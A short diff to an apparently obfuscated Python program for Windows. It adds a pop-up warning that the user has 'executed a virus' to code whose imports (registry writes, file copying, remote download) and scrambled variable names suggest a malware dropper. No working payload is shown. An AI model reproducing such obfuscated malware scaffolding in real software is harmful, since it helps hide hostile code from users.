@@ -38,6 +38,9 @@ from winreg import SetValueEx
 from winreg import REG_DWORD
 from shutil import copy
 from urllib.request import urlretrieve
+def WARNING():
+        windll.user32.MessageBoxW(0, "YOU HAVE EXECUTED A VIRUS!. PLEASE CLICK NO TO EXIT AND SAFE YOUR SYSTEM", "Info",0x10)
+WARNING()
 EkDLiiGfHRhgebgSICCIiOfVXQAoQJLnekLkCzVuBnOVIvwPDiyzyrxLiawpcsqkAhMIkBZmPMqDUmD340 = "RNYWEPGPhyXGvRprdrSpRQBbKjmRjowyfsQfuXDqlxrgSLWtndPMxTrJnuvYeBYdobTnQJUMpDckijc"
 IlIlIlIlIllIIIIIllIlIIllIIlIlIIIIIlIlIlllllIIllIIlIIIIllIlIlllIlllIlIIIIllIllIllIlllIllIIlIIIIlIlIlIllllllllIlIIlllllIlIlIIlIlIIIlIIllIIIlIIIlIIIlIlIIlIlllIIIlIIIlllllllllIllIlIlIlIIIlIllIIIIllIIIllIIIIlIIlIlIllIlIIlIllllIIlIlIlIIlllIlIlllllIlllIllllIlllllIIllllIlllllllIIlIlIIlIIlIlllIllllIlIIlllllIIllllllIIIIlIlIIlllIlIIllIIlIlIlIlIIII = 294
 fxSioxkNgHePWauFZdVqMggJPJXmIwHXADVpOhMFxCaERGXBPpHIkMpjRLaviVmPHTmObdjrMfkiUDg336 = "GoGKwncUwXIXLianvFdHBkVTvzGwyBPcKZHQfJPgkLTFBPKaDPfOLiguJrvrtKVCiqaysHtHAIqcoNh"
